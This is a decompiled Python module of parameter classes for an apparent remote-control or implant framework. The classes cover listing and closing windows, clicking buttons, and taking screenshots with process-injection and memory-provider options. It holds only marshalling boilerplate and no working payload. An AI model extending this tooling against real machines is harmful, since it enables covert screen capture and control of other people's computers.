# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: type_Params.py
from types import *
PARAMS_SCREENSHOT_RESOLUTION_LOW = 0
PARAMS_SCREENSHOT_RESOLUTION_MEDIUM = 1
PARAMS_SCREENSHOT_RESOLUTION_HIGH = 2
PARAMS_SCREENSHOT_FORMAT_BMP = 0
PARAMS_SCREENSHOT_FORMAT_GIF = 1
PARAMS_SCREENSHOT_FORMAT_JPG = 2
PARAMS_SCREENSHOT_FORMAT_PNG = 3
PARAMS_MEM_PROVIDER_NONE = 4294967295L
PARAMS_MEM_PROVIDER_ANY = 0
PARAMS_MEM_PROVIDER_STANDARD = 1
PARAMS_MEM_PROVIDER_DRNI = 2
PARAMS_INJECT_PROVIDER_NONE = 4294967295L
PARAMS_INJECT_PROVIDER_ANY = 0
PARAMS_INJECT_PROVIDER_STANDARD = 1
PARAMS_INJECT_PROVIDER_DRNI = 2

class ParamsListWindows:

    def __init__(self):
        self.__dict__['winSta'] = ''
        self.__dict__['desktop'] = ''

    def __getattr__(self, name):
        if name == 'winSta':
            return self.__dict__['winSta']
        if name == 'desktop':
            return self.__dict__['desktop']
        raise AttributeError("Attribute '%s' not found" % name)

    def __setattr__(self, name, value):
        if name == 'winSta':
            self.__dict__['winSta'] = value
        elif name == 'desktop':
            self.__dict__['desktop'] = value
        else:
            raise AttributeError("Attribute '%s' not found" % name)

    def Marshal(self, mmsg):
        from mcl.object.Message import MarshalMessage
        submsg = MarshalMessage()
        submsg.AddStringUtf8(MSG_KEY_PARAMS_LISTWINDOWS_WINSTA, self.__dict__['winSta'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_LISTWINDOWS_DESKTOP, self.__dict__['desktop'])
        mmsg.AddMessage(MSG_KEY_PARAMS_LISTWINDOWS, submsg)

    def Demarshal(self, dmsg, instance=-1):
        import mcl.object.Message
        msgData = dmsg.FindData(MSG_KEY_PARAMS_LISTWINDOWS, mcl.object.Message.MSG_TYPE_MSG, instance)
        submsg = mcl.object.Message.DemarshalMessage(msgData)
        self.__dict__['winSta'] = submsg.FindString(MSG_KEY_PARAMS_LISTWINDOWS_WINSTA)
        self.__dict__['desktop'] = submsg.FindString(MSG_KEY_PARAMS_LISTWINDOWS_DESKTOP)


class ParamsCloseWindow:

    def __init__(self):
        self.__dict__['winSta'] = ''
        self.__dict__['desktop'] = ''
        self.__dict__['hWnd'] = 0

    def __getattr__(self, name):
        if name == 'winSta':
            return self.__dict__['winSta']
        if name == 'desktop':
            return self.__dict__['desktop']
        if name == 'hWnd':
            return self.__dict__['hWnd']
        raise AttributeError("Attribute '%s' not found" % name)

    def __setattr__(self, name, value):
        if name == 'winSta':
            self.__dict__['winSta'] = value
        elif name == 'desktop':
            self.__dict__['desktop'] = value
        elif name == 'hWnd':
            self.__dict__['hWnd'] = value
        else:
            raise AttributeError("Attribute '%s' not found" % name)

    def Marshal(self, mmsg):
        from mcl.object.Message import MarshalMessage
        submsg = MarshalMessage()
        submsg.AddStringUtf8(MSG_KEY_PARAMS_CLOSEWINDOW_WINSTA, self.__dict__['winSta'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_CLOSEWINDOW_DESKTOP, self.__dict__['desktop'])
        submsg.AddU64(MSG_KEY_PARAMS_CLOSEWINDOW_HWND, self.__dict__['hWnd'])
        mmsg.AddMessage(MSG_KEY_PARAMS_CLOSEWINDOW, submsg)

    def Demarshal(self, dmsg, instance=-1):
        import mcl.object.Message
        msgData = dmsg.FindData(MSG_KEY_PARAMS_CLOSEWINDOW, mcl.object.Message.MSG_TYPE_MSG, instance)
        submsg = mcl.object.Message.DemarshalMessage(msgData)
        self.__dict__['winSta'] = submsg.FindString(MSG_KEY_PARAMS_CLOSEWINDOW_WINSTA)
        self.__dict__['desktop'] = submsg.FindString(MSG_KEY_PARAMS_CLOSEWINDOW_DESKTOP)
        self.__dict__['hWnd'] = submsg.FindU64(MSG_KEY_PARAMS_CLOSEWINDOW_HWND)


class ParamsListButtons:

    def __init__(self):
        self.__dict__['winSta'] = ''
        self.__dict__['desktop'] = ''
        self.__dict__['hWnd'] = 0

    def __getattr__(self, name):
        if name == 'winSta':
            return self.__dict__['winSta']
        if name == 'desktop':
            return self.__dict__['desktop']
        if name == 'hWnd':
            return self.__dict__['hWnd']
        raise AttributeError("Attribute '%s' not found" % name)

    def __setattr__(self, name, value):
        if name == 'winSta':
            self.__dict__['winSta'] = value
        elif name == 'desktop':
            self.__dict__['desktop'] = value
        elif name == 'hWnd':
            self.__dict__['hWnd'] = value
        else:
            raise AttributeError("Attribute '%s' not found" % name)

    def Marshal(self, mmsg):
        from mcl.object.Message import MarshalMessage
        submsg = MarshalMessage()
        submsg.AddStringUtf8(MSG_KEY_PARAMS_LISTBUTTONS_WINSTA, self.__dict__['winSta'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_LISTBUTTONS_DESKTOP, self.__dict__['desktop'])
        submsg.AddU64(MSG_KEY_PARAMS_LISTBUTTONS_HWND, self.__dict__['hWnd'])
        mmsg.AddMessage(MSG_KEY_PARAMS_LISTBUTTONS, submsg)

    def Demarshal(self, dmsg, instance=-1):
        import mcl.object.Message
        msgData = dmsg.FindData(MSG_KEY_PARAMS_LISTBUTTONS, mcl.object.Message.MSG_TYPE_MSG, instance)
        submsg = mcl.object.Message.DemarshalMessage(msgData)
        self.__dict__['winSta'] = submsg.FindString(MSG_KEY_PARAMS_LISTBUTTONS_WINSTA)
        self.__dict__['desktop'] = submsg.FindString(MSG_KEY_PARAMS_LISTBUTTONS_DESKTOP)
        self.__dict__['hWnd'] = submsg.FindU64(MSG_KEY_PARAMS_LISTBUTTONS_HWND)


class ParamsClickButton:

    def __init__(self):
        self.__dict__['winSta'] = ''
        self.__dict__['desktop'] = ''
        self.__dict__['hWnd'] = 0
        self.__dict__['buttonText'] = ''

    def __getattr__(self, name):
        if name == 'winSta':
            return self.__dict__['winSta']
        if name == 'desktop':
            return self.__dict__['desktop']
        if name == 'hWnd':
            return self.__dict__['hWnd']
        if name == 'buttonText':
            return self.__dict__['buttonText']
        raise AttributeError("Attribute '%s' not found" % name)

    def __setattr__(self, name, value):
        if name == 'winSta':
            self.__dict__['winSta'] = value
        elif name == 'desktop':
            self.__dict__['desktop'] = value
        elif name == 'hWnd':
            self.__dict__['hWnd'] = value
        elif name == 'buttonText':
            self.__dict__['buttonText'] = value
        else:
            raise AttributeError("Attribute '%s' not found" % name)

    def Marshal(self, mmsg):
        from mcl.object.Message import MarshalMessage
        submsg = MarshalMessage()
        submsg.AddStringUtf8(MSG_KEY_PARAMS_CLICKBUTTON_WINSTA, self.__dict__['winSta'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_CLICKBUTTON_DESKTOP, self.__dict__['desktop'])
        submsg.AddU64(MSG_KEY_PARAMS_CLICKBUTTON_HWND, self.__dict__['hWnd'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_CLICKBUTTON_BUTTON_TEXT, self.__dict__['buttonText'])
        mmsg.AddMessage(MSG_KEY_PARAMS_CLICKBUTTON, submsg)

    def Demarshal(self, dmsg, instance=-1):
        import mcl.object.Message
        msgData = dmsg.FindData(MSG_KEY_PARAMS_CLICKBUTTON, mcl.object.Message.MSG_TYPE_MSG, instance)
        submsg = mcl.object.Message.DemarshalMessage(msgData)
        self.__dict__['winSta'] = submsg.FindString(MSG_KEY_PARAMS_CLICKBUTTON_WINSTA)
        self.__dict__['desktop'] = submsg.FindString(MSG_KEY_PARAMS_CLICKBUTTON_DESKTOP)
        self.__dict__['hWnd'] = submsg.FindU64(MSG_KEY_PARAMS_CLICKBUTTON_HWND)
        self.__dict__['buttonText'] = submsg.FindString(MSG_KEY_PARAMS_CLICKBUTTON_BUTTON_TEXT)


class ParamsScreenshot:

    def __init__(self):
        self.__dict__['hWnd'] = 0
        self.__dict__['winSta'] = 'WinSta0'
        self.__dict__['desktop'] = ''
        self.__dict__['resolution'] = PARAMS_SCREENSHOT_RESOLUTION_LOW
        self.__dict__['format'] = PARAMS_SCREENSHOT_FORMAT_BMP
        self.__dict__['pid'] = 0
        self.__dict__['force'] = False
        self.__dict__['memoryProvider'] = PARAMS_MEM_PROVIDER_ANY
        self.__dict__['injectProvider'] = PARAMS_INJECT_PROVIDER_ANY

    def __getattr__(self, name):
        if name == 'hWnd':
            return self.__dict__['hWnd']
        if name == 'winSta':
            return self.__dict__['winSta']
        if name == 'desktop':
            return self.__dict__['desktop']
        if name == 'resolution':
            return self.__dict__['resolution']
        if name == 'format':
            return self.__dict__['format']
        if name == 'pid':
            return self.__dict__['pid']
        if name == 'force':
            return self.__dict__['force']
        if name == 'memoryProvider':
            return self.__dict__['memoryProvider']
        if name == 'injectProvider':
            return self.__dict__['injectProvider']
        raise AttributeError("Attribute '%s' not found" % name)

    def __setattr__(self, name, value):
        if name == 'hWnd':
            self.__dict__['hWnd'] = value
        elif name == 'winSta':
            self.__dict__['winSta'] = value
        elif name == 'desktop':
            self.__dict__['desktop'] = value
        elif name == 'resolution':
            self.__dict__['resolution'] = value
        elif name == 'format':
            self.__dict__['format'] = value
        elif name == 'pid':
            self.__dict__['pid'] = value
        elif name == 'force':
            self.__dict__['force'] = value
        elif name == 'memoryProvider':
            self.__dict__['memoryProvider'] = value
        elif name == 'injectProvider':
            self.__dict__['injectProvider'] = value
        else:
            raise AttributeError("Attribute '%s' not found" % name)

    def Marshal(self, mmsg):
        from mcl.object.Message import MarshalMessage
        submsg = MarshalMessage()
        submsg.AddU64(MSG_KEY_PARAMS_SCREENSHOT_HWND, self.__dict__['hWnd'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_SCREENSHOT_WINSTA, self.__dict__['winSta'])
        submsg.AddStringUtf8(MSG_KEY_PARAMS_SCREENSHOT_DESKTOP, self.__dict__['desktop'])
        submsg.AddU32(MSG_KEY_PARAMS_SCREENSHOT_RESOLUTION, self.__dict__['resolution'])
        submsg.AddU32(MSG_KEY_PARAMS_SCREENSHOT_FORMAT, self.__dict__['format'])
        submsg.AddU32(MSG_KEY_PARAMS_SCREENSHOT_PID, self.__dict__['pid'])
        submsg.AddBool(MSG_KEY_PARAMS_SCREENSHOT_FORCE, self.__dict__['force'])
        submsg.AddU32(MSG_KEY_PARAMS_SCREENSHOT_MEMORY_PROVIDER, self.__dict__['memoryProvider'])
        submsg.AddU32(MSG_KEY_PARAMS_SCREENSHOT_INJECT_PROVIDER, self.__dict__['injectProvider'])
        mmsg.AddMessage(MSG_KEY_PARAMS_SCREENSHOT, submsg)

    def Demarshal(self, dmsg, instance=-1):
        import mcl.object.Message
        msgData = dmsg.FindData(MSG_KEY_PARAMS_SCREENSHOT, mcl.object.Message.MSG_TYPE_MSG, instance)
        submsg = mcl.object.Message.DemarshalMessage(msgData)
        try:
            self.__dict__['hWnd'] = submsg.FindU64(MSG_KEY_PARAMS_SCREENSHOT_HWND)
        except:
            pass

        try:
            self.__dict__['winSta'] = submsg.FindString(MSG_KEY_PARAMS_SCREENSHOT_WINSTA)
        except:
            pass

        try:
            self.__dict__['desktop'] = submsg.FindString(MSG_KEY_PARAMS_SCREENSHOT_DESKTOP)
        except:
            pass

        try:
            self.__dict__['resolution'] = submsg.FindU32(MSG_KEY_PARAMS_SCREENSHOT_RESOLUTION)
        except:
            pass

        try:
            self.__dict__['format'] = submsg.FindU32(MSG_KEY_PARAMS_SCREENSHOT_FORMAT)
        except:
            pass

        try:
            self.__dict__['pid'] = submsg.FindU32(MSG_KEY_PARAMS_SCREENSHOT_PID)
        except:
            pass

        try:
            self.__dict__['force'] = submsg.FindBool(MSG_KEY_PARAMS_SCREENSHOT_FORCE)
        except:
            pass

        try:
            self.__dict__['memoryProvider'] = submsg.FindU32(MSG_KEY_PARAMS_SCREENSHOT_MEMORY_PROVIDER)
        except:
            pass

        try:
            self.__dict__['injectProvider'] = submsg.FindU32(MSG_KEY_PARAMS_SCREENSHOT_INJECT_PROVIDER)
        except:
            pass